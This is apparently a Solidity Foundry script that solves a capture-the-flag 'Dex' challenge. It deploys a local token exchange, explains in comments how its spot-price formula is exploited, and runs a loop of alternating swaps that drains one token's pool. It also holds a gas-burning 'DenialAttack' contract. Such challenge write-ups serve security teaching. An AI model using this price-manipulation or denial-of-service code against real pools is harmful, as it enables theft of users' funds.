// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Dex, SwappableToken} from "../src/Dex.sol";

contract DexSolution is Script {
    // $ forge script script/Dex.s.sol --tc DexSolution -vvvv

    Dex dexInstance;
    SwappableToken token1;
    SwappableToken token2;

    function run() external {
        // Making the state to start the Challenge with
        dexInstance = new Dex();

        token1 = new SwappableToken(address(dexInstance), "Token1", "TK1", 110);
        token2 = new SwappableToken(address(dexInstance), "Token2", "TK2",110);

        dexInstance.setTokens(address(token1), address(token2));
        dexInstance.approve(address(dexInstance), 100);

        dexInstance.addLiquidity(address(token1), 100);
        dexInstance.addLiquidity(address(token2), 100);

        address swapper = makeAddr("swapper");
        vm.deal(swapper, 1 ether);

        token1.transfer(swapper, 10);
        token2.transfer(swapper, 10);

        // --- Attack will start

        vm.startPrank(swapper);

        console.log("---> DEX State Before Making The Attack <---");
        console.log("DEX token1 liquidity:", token1.balanceOf(address(dexInstance)));
        console.log("DEX token2 liquidity:", token2.balanceOf(address(dexInstance)));
        console.log("Swapper token1 balance:", token1.balanceOf(swapper));
        console.log("Swapper token2 balance:", token2.balanceOf(swapper));
        console.log("-----------------");

        // - The code represents an AMM code that is used to determine the price of a token relative to another token.
        // -
        //  - liquidityFrom => the amount of first pair of tokens existed in the pool
        //  - liquidityTo   => the amount of second pair of  tokens existed in the pool
        //  - amountIn      => the amount of tokenFrom you entered
        //  - amountOut     => the amount of tokenTo you will receive
        //
        // -
        //  - the amountOut = amountIn * tokenFrom / tokenTo
        //
        // - We will start with 10 tokens from each token and the liquidity is 100 for each token too.
        // - If we made a relation between input and output, you will find that [amountOut / amountIn = liquidityTo / liquidityFrom]
        // - We will swap our 10 token1 to get token 2.
        // - Since the amount of token1 = the amount of token2, the tokens will be traded in 1:1 ration.
        //
        // - After swapping the results will be
        //  - DEX token1 liquidity: 110
        //  - DEX token2 liquidity: 90
        //  - Swapper token1 balance: 0
        //  - Swapper token2 balance: 20
        //
        // - Now, if we swapped back the 20 token2 what token1 we will get?
        // - amountOut = amountIn * liquidityTo / liquidityFrom = 20 * 110 / 90 = 24!
        // - If we swapped our tokens pack we will get 24 token1 instead of 20. But how did this happen?
        // - The amountOut is directly prop. to the liquidity of the receiving token, and inversely prop. to the liquidity of the sending token.
        // - So by swapping tokens 1 => 2, liquidity1 increases and liquidity2 decreases.
        // -
        // - In the second swap, liquidityTo ↑ and liquidityFrom ↓. So the amountOut will increase.
        // - When making the second swap of 20 tokens from token1 => token2, the calculations will give us more amountOut.
        // - By doing this steps more than one time, token1 => token2 then token2 => token1, we will drain token1 or token2 liquidity, depends on the first swap you did.
        // - Challenge will be passed when one of the tokens get drained from the liquidity pool (amount = 0).
        //
        //
        // - We will need to apply the DSA course we took in the colledge to drain the pool :), you can check it out down below.

        console.log("Making The Attack ...");
        dexInstance.approve(address(dexInstance), 1_000); // We are approving a large amount of tokens to the DEX, to not approve in each swap function
        dexInstance.swap(address(token1), address(token2), 10); // This step is necessary to have only one amount of token

        // Draining pool Algorithm (You should have only one pair of tokens in balance. We did in the prev step)
        while (token2.balanceOf(address(dexInstance)) > 0 && token1.balanceOf(address(dexInstance)) > 0) {
            uint256 swapperToken1Balance = token1.balanceOf(swapper);
            uint256 swapperToken2Balance = token2.balanceOf(swapper);
            uint256 dexToken1Balance = token1.balanceOf(address(dexInstance));
            uint256 dexToken2Balance = token2.balanceOf(address(dexInstance));

            if (dexToken1Balance > 0 && swapperToken2Balance > 0) {
                uint256 outAmountToken1 =
                    dexInstance.getSwapPrice(address(token2), address(token1), swapperToken2Balance);

                uint256 inAmountToken2;

                if (outAmountToken1 > dexToken1Balance) {
                    inAmountToken2 = getInFromOut(dexToken2Balance, dexToken1Balance, dexToken1Balance);
                } else {
                    inAmountToken2 = swapperToken2Balance;
                }

                dexInstance.swap(address(token2), address(token1), inAmountToken2);
            }
            if (dexToken2Balance > 0 && swapperToken1Balance > 0) {
                uint256 outAmountToken2 =
                    dexInstance.getSwapPrice(address(token1), address(token2), swapperToken1Balance);

                uint256 inAmountToken1;

                if (outAmountToken2 > dexToken2Balance) {
                    inAmountToken1 = getInFromOut(dexToken1Balance, dexToken2Balance, dexToken2Balance);
                } else {
                    inAmountToken1 = swapperToken1Balance;
                }

                dexInstance.swap(address(token1), address(token2), inAmountToken1);
            }
        }

        // Logging the pool information
        _logging(swapper);
    }

    function getInFromOut(uint256 fromBalance, uint256 toBalance, uint256 amount) internal pure returns (uint256) {
        return amount * fromBalance / toBalance;
    }

    function _logging(address swapper) internal view {
        console.log("---> DEX State After Making The Attack <---");
        console.log("DEX token1 liquidity:", token1.balanceOf(address(dexInstance)));
        console.log("DEX token2 liquidity:", token2.balanceOf(address(dexInstance)));
        console.log("Swapper token1 balance:", token1.balanceOf(swapper));
        console.log("Swapper token2 balance:", token2.balanceOf(swapper));
    }
}

contract DenialAttack {
    receive() external payable {
        for (uint256 i = 0; i < 1_000_000; i++) {}
    }
}
